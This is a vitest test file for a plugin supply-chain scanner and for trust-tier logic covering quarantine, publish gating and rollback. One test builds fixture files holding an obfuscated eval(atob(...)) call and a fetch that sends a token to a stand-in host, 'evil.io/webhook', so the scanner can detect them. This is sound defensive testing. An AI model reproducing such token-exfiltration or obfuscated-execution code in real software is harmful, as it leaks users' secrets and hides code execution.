import { describe, it, expect } from 'vitest';
import { mkdtempSync, writeFileSync, mkdirSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, dirname } from 'node:path';
import { computePluginHash, heuristicScan, scanPlugin, renderScanReport } from './supply-chain.js';
import { evaluateTrust, trustBadge, VersionHistory, canPublish } from './trust.js';

function pluginDir(extra: Array<[string, string]> = []) {
  const dir = mkdtempSync(join(tmpdir(), 'scan-'));
  mkdirSync(join(dir, 'src'), { recursive: true });
  writeFileSync(join(dir, 'src', 'index.js'), 'export const ok = 1;\n');
  for (const [rel, content] of extra) {
    const full = join(dir, rel);
    mkdirSync(dirname(full), { recursive: true });
    writeFileSync(full, content);
  }
  return dir;
}

describe('supply-chain scan', () => {
  it('computes a stable hash and finds no issues on clean plugins', async () => {
    const dir = pluginDir();
    const { hash, files } = computePluginHash(dir);
    expect(hash).toMatch(/^[0-9a-f]{64}$/);
    expect(files).toBe(1);
    const report = await scanPlugin(dir, 'clean/plugin');
    expect(report.verdict).toBe('unknown');
    expect(report.findings).toHaveLength(0);
    rmSync(dir, { recursive: true, force: true });
  });

  it('flags obfuscation and exfiltration patterns', async () => {
    const dir = pluginDir([
      ['src/sneaky.js', `const x = eval(atob("aGVsbG8="));${'x'.repeat(3000)}`],
      ['src/exfil.js', 'const t = "abc"; fetch("https://evil.io/webhook?token=" + t)'],
    ]);
    const findings = heuristicScan(dir);
    expect(findings.some((f) => f.severity === 'high')).toBe(true);
    const report = await scanPlugin(dir, 'bad/plugin');
    expect(report.verdict).toBe('malicious');
    expect(renderScanReport(report)).toContain('malicious');
    rmSync(dir, { recursive: true, force: true });
  });

  it('uses external hash lookup when provided', async () => {
    const dir = pluginDir();
    const report = await scanPlugin(dir, 'x/y', {
      lookupHash: async (hash) => (hash.startsWith('deadbeef') ? 'malicious' : 'clean'),
    });
    expect(report.verdict).toBe('clean');
    rmSync(dir, { recursive: true, force: true });
  });
});

describe('trust tiers', () => {
  it('quarantines on malicious scan and keeps trusted levels', () => {
    expect(evaluateTrust({ level: 'trusted' }, { scanVerdict: 'clean' }).level).toBe('trusted');
    expect(evaluateTrust({ level: 'trusted' }, { scanVerdict: 'malicious' }).level).toBe(
      'quarantined',
    );
    expect(evaluateTrust({ level: 'community' }, { reputation: 0.9 }).level).toBe('community');
    expect(trustBadge('trusted')).toBe('🛡️ trusted');
    expect(trustBadge('quarantined')).toBe('🚫 quarantined');
  });

  it('blocks publishing on quarantine or pin mismatch', () => {
    const policy = { level: 'community' as const, pinnedTag: 'v1' };
    expect(canPublish({ version: 'v1.2.0' } as never, policy, 'clean').allowed).toBe(true);
    expect(canPublish({ version: '2.0.0' } as never, policy, 'clean').allowed).toBe(false);
    expect(canPublish({ version: '1.0.0' } as never, policy, 'suspicious').allowed).toBe(false);
  });

  it('tracks version history and supports rollback', () => {
    const h = new VersionHistory();
    h.record('p', '1.0.0');
    h.record('p', '1.1.0');
    expect(h.previous('p')?.version).toBe('1.0.0');
    const rolled = h.rollback('p');
    expect(rolled?.version).toBe('1.0.0');
    expect(h.list('p').map((v) => v.version)).toEqual(['1.0.0']);
  });
});
